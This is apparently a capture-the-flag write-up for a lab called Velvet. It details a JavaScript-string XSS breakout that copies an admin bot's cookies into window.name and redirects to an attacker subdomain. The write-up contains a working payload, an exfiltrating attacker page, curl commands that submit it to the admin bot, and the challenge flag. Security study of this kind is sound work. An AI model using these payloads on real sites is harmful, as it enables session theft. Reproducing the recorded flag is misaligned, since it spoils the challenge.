# Velvet JavaScript String Breakout With `window.name`

## What Is Happening

The Velvet lab reflects the `message` query parameter into a JavaScript string on `/profile` and offers a `/share` feature that sends same-origin URLs to an admin bot.

The filter is strict enough to block many common XSS characters and function-call syntax, but it still allows quotes, slashes, semicolons, letters, digits, and dots. That is enough to break out of the string, copy `document.cookie` into `window.name`, and redirect the admin browser to an attacker-controlled page.

## Why It Happens

The vulnerable reflection is:

```javascript
var message = "PAYLOAD";
```

This is a JavaScript string context, not HTML. The important property is that `"` is allowed, so the attacker can terminate the string and continue with valid JavaScript statements.

The admin bot visits attacker-supplied same-origin `/profile?message=...` URLs with privileged cookies. In the target runtime, `window.name` survives a top-level cross-origin navigation, so it can carry the admin cookie value to the attacker page without needing blocked characters such as `+`, `?`, `:`, or `()`.

## Exact Test

Confirm the sink:

```bash
curl -sS -b /tmp/velvet-cj \
  "https://1877bcf64628.pwnbox-lab.com/profile?message=test"
```

The reflected script contains:

```javascript
var message = "test";
```

Create an attacker page on a controlled subdomain:

```html
<!doctype html><meta charset="utf-8"><title>wnfresh</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

Use this payload:

```text
";name=document.cookie;location='//wnfresh.l30on.top'//
```

Full victim URL:

```text
https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//
```

Submit it to the admin bot:

```bash
curl -sS -X POST "https://1877bcf64628.pwnbox-lab.com/share" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<demo-session>" \
  -d '{"url":"https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//"}'
```

Then inspect attacker-side logs for:

```text
/x?d=session%3D...%3B%20FLAG%3Dpwnbox%7B...%7D
```

## Expected Signal

- `/share` accepts the same-origin URL.
- The admin bot requests `/` on the attacker subdomain.
- The attacker page makes a second request to `/x?d=...`.
- The `d` value contains the admin cookie string, including the flag.

## Result Interpretation

Confirmed chain:

```text
Reflected JavaScript-string XSS
-> same-origin admin bot review
-> document.cookie copied into window.name
-> top-level cross-origin navigation
-> attacker page reads window.name
-> same-site log captures admin cookie and flag
```

## Root Cause

- User input is inserted into executable JavaScript without proper context-aware encoding.
- The WAF is only character-based and does not stop semantic string breakout.
- The admin bot visits attacker-controlled same-origin URLs while carrying privileged cookies.
- Sensitive cookie data is readable from JavaScript.

## Impact

- Theft of privileged session material from the admin bot.
- Recovery of the lab flag directly from the admin browser context.
- Real-world analog: support, moderation, or review bots visiting same-origin user-controlled pages can leak sessions or perform privileged actions.

## Fix

- Encode user input for JavaScript-string context or stop embedding it into script blocks.
- Prefer server rendering into inert text nodes or safe templating APIs.
- Mark sensitive cookies `HttpOnly`.
- Review untrusted pages on an isolated origin or in a stripped-down bot session.
- Add tests that cover reflected parameters and admin-bot review endpoints together.

## Key Lesson

When a WAF blocks the usual XSS punctuation, step back and ask which minimal JavaScript statements are still legal. Here, `name=document.cookie` and `location='//host'` were enough. `window.name` became the data carrier that avoided blocked concatenation and query-construction syntax.

## Flag

`pwnbox{f665ddb79c5e5d390213498ce8909184}`
